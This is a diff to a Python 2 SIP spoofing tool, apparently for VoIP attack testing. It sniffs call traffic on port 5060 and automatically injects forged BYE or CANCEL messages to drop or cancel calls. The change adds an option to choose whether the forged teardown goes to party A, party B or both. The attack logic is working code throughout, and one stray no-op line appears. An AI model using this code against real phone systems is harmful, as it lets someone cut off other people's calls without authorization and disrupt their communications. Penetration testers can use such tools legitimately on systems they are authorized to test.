@@ -28,6 +28,7 @@ class spooferUser(User):
 		self.spoof_remote_tag = app.options.spoof_remote_tag
 		self.spoof_callID = app.options.spoof_callID
 		self.spoof_auto = app.options.spoof_auto
+		self.auto_spoof_target = app.options.auto_spoof_target
         #Spoofer sets
 		self._spooferGen = None
 		self._snifferGen = None
@@ -55,7 +56,6 @@ class spooferUser(User):
 				self._spooferGen  = self._spoofing()
 				multitask.add(self._spooferGen)
 		return self
-		
 	def add_sniffer(self):
 		if not self._snifferGen:
 			self._snifferGen  = self._sniffer(prn=self._auto_SIPrecvd, filter="ip and port 5060", store=0)
@@ -63,13 +63,13 @@ class spooferUser(User):
 		return self
 	
 	# Spoof msg content ---------
-	def spoofMsg(self,message,dest=None):
-		def _createBYE(message,dest):
+	def spoofMsg(self,message,B_host=False):
+		def _createBYE(message,B_host=False):
 			def BYEheaders(message):
 				'''Read-only list of transaction Header objects (To, From, CSeq, Call-ID)'''
 				return map(lambda x: message[x], ['To', 'From', 'Call-ID'])
 			m = rfc3261.Message.createRequest('BYE', str(self.remoteParty), BYEheaders(message))
-			if dest==1:
+			if B_host:
 				m['CSeq'] = rfc3261.Header('2 BYE', 'CSeq')
 			else:
 				m['CSeq'] = rfc3261.Header(str(message.CSeq.number+1) + ' BYE', 'CSeq')
@@ -84,20 +84,19 @@ class spooferUser(User):
 			return m
 		# Auto Spoofs -----------
 		if self.spoof_auto:
+			if B_host:
+				from_Header = message.From
+				to_Header =  message.To
+				message['To'] = rfc3261.Header(str(from_Header), 'To')
+				message['From'] = rfc3261.Header(str(to_Header), 'From')
+			self.remoteParty = rfc3261.Address(str(message.To.value.uri))
+			self.remoteParty.uri.port = self.app.options.port
+			# Spoof BYE message
 			if self.spoof_mode == 'spfBYE':
-				if dest==1:
-					from_Header = message.From
-					to_Header =  message.To
-					message['Via'] = rfc3261.Header('SIP/2.0/UDP '+str(message.To.value.uri.host)+(':'+str(message.To.value.uri.port) if (m7.To.value.uri.port) else '')+';branch='+('z9hG4bK' + str(urlsafe_b64encode(md5('All That is Gold Does Not Glitter').digest())).replace('=','.'))+';rport', 'Via')
-					message['To'] = rfc3261.Header(str(from_Header), 'To')
-					message['From'] = rfc3261.Header(str(to_Header), 'From')
-				self.remoteParty = rfc3261.Address(str(message.To.value.uri))
-				self.remoteParty.uri.port = self.app.options.port
-				message = _createBYE(message,dest)
-			if self.spoof_mode == 'spfCANCEL':
-				self.remoteParty = rfc3261.Address(str(message.To.value.uri))
-				self.remoteParty.uri.port = self.app.options.port
-				message = _createCANCEL(message)
+				message = _createBYE(message,B_host)
+				if B_host: message['Via'] = rfc3261.Header('SIP/2.0/UDP '+str(message.To.value.uri.host)+(':'+str(message.To.value.uri.port) if (message.To.value.uri.port) else '')+';branch='+('z9hG4bK' + str(urlsafe_b64encode(md5('All That is Gold Does Not Glitter').digest())).replace('=','.'))+';rport', 'Via')
+			# Spoof CANCEL message
+			if self.spoof_mode == 'spfCANCEL': message = _createCANCEL(message)
 		# Manual Spoofs ---------
 		else:
 			# Spoofs ---------
@@ -131,22 +130,29 @@ class spooferUser(User):
 			#SIP message received -> AutoSpoof
 			if self.spoof_mode == 'spfBYE':
 				if (str(m.response) == "200") and (m.Cseq.method == "INVITE"):
-					# To host 0
-					spoof_message = self.spoofMsg(m)
-					print "-------Sending BYE to: "+str(self.remoteParty.uri.hostPort)+"-------"
-					print spoof_message
-					self.send(str(spoof_message),self.remoteParty.uri.hostPort,None)
-					# To host 1
-					spoof_message = self.spoofMsg(m,1)
-					print "-------Sending BYE to: "+str(self.remoteParty.uri.hostPort)+"-------"
-					print spoof_message
-					self.send(str(spoof_message),self.remoteParty.uri.hostPort,None)
+					# BYE to host A
+					if ('A' in self.auto_spoof_target):
+						str('A' in 'AB')
+						spoof_message = self.spoofMsg(m)
+						print "[*] Sending BYE to (A): "+str(self.remoteParty.uri.hostPort)
+						self.send(str(spoof_message),self.remoteParty.uri.hostPort,None)
+					# BYE to host B
+					if ('B' in self.auto_spoof_target):
+						spoof_message = self.spoofMsg(m,B_host=True)
+						print "[*] Sending BYE to (B): "+str(self.remoteParty.uri.hostPort)
+						self.send(str(spoof_message),self.remoteParty.uri.hostPort,None)
 			if self.spoof_mode == 'spfCANCEL':
 				if (str(m.response) == "180"):
-					spoof_message = self.spoofMsg(m)
-					print "-------Sending CANCEL to: "+str(self.remoteParty.uri.hostPort)+"-------"
-					print spoof_message
-					self.send(str(spoof_message),self.remoteParty.uri.hostPort,None)
+					# CANCEL to host A
+					if ('A' in self.auto_spoof_target):
+						spoof_message = self.spoofMsg(m)
+						print "[*] Sending CANCEL to (A): "+str(self.remoteParty.uri.hostPort)
+						self.send(str(spoof_message),self.remoteParty.uri.hostPort,None)
+					# CANCEL to host B
+					if ('B' in self.auto_spoof_target):
+						spoof_message = self.spoofMsg(m,B_host=True)
+						print "[*] Sending CANCEL to (B): "+str(self.remoteParty.uri.hostPort)
+						self.send(str(spoof_message),self.remoteParty.uri.hostPort,None)
 		except ValueError, E: pass # TODO: send 400 response to non-ACK request
 	def _auto_spoofing(self):
 		try:
